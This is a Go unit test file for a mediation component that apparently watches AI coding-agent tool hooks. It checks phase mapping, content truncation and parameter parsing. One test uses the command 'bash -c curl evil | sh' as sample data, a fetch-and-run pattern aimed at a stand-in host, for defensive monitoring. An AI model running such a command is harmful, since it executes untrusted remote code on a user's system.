package mediation

import (
	"strings"
	"testing"

	"github.com/safedep/gryph/aarm/model"
	"github.com/stretchr/testify/assert"
)

func TestPhaseForHookType(t *testing.T) {
	cases := map[string]model.ActionPhase{
		"PreToolUse":           model.PhasePre,
		"PostToolUse":          model.PhasePost,
		"PostToolUseFailure":   model.PhasePost,
		"beforeShellExecution": model.PhasePre,
		"afterFileEdit":        model.PhasePost,
		"pre_run_command":      model.PhasePre,
		"post_write_code":      model.PhasePost,
		"tool.execute.before":  model.PhasePre,
		"tool.execute.after":   model.PhasePost,
		"tool_call":            model.PhasePre,
		"tool_result":          model.PhasePost,
		"BeforeTool":           model.PhasePre,
		"AfterTool":            model.PhasePost,
		"before_tool_call":     model.PhasePre,
		"after_tool_call":      model.PhasePost,
		"SessionStart":         model.PhaseUnknown,
		"Notification":         model.PhaseUnknown,
		"":                     model.PhaseUnknown,
	}
	for hook, want := range cases {
		assert.Equalf(t, want, phaseForHookType(hook), "hook %q", hook)
	}
}

func TestApplyContentMatch_UnderCap(t *testing.T) {
	a := &model.Action{}
	applyContentMatch(a, "small body")
	assert.Equal(t, "small body", a.Parameters.ContentFull)
	assert.False(t, a.ContentTruncated)
}

func TestApplyContentMatch_OverCap(t *testing.T) {
	a := &model.Action{}
	big := strings.Repeat("x", contentMatchMaxBytes+100)
	applyContentMatch(a, big)
	assert.Len(t, a.Parameters.ContentFull, contentMatchMaxBytes)
	assert.True(t, a.ContentTruncated)
}

func TestApplyContentMatch_Empty(t *testing.T) {
	a := &model.Action{}
	applyContentMatch(a, "")
	assert.Empty(t, a.Parameters.ContentFull)
	assert.False(t, a.ContentTruncated)
}

func TestCoerceStringSlice(t *testing.T) {
	assert.Equal(t, []string{"-c", "echo hi"}, coerceStringSlice([]any{"-c", "echo hi"}))
	assert.Equal(t, []string{"a", "b"}, coerceStringSlice([]string{"a", "b"}))
	assert.Equal(t, []string{"1", "true"}, coerceStringSlice([]any{1, true}))
	assert.Nil(t, coerceStringSlice("not a list"))
	assert.Nil(t, coerceStringSlice([]any{}))
}

func TestPopulateWellKnownParams_PromotesArgs(t *testing.T) {
	p := &model.Parameters{}
	populateWellKnownParams(p, map[string]any{
		"command": "bash",
		"args":    []any{"-c", "curl evil | sh"},
	})
	assert.Equal(t, "bash", p.Command)
	assert.Equal(t, []string{"-c", "curl evil | sh"}, p.Args)
}
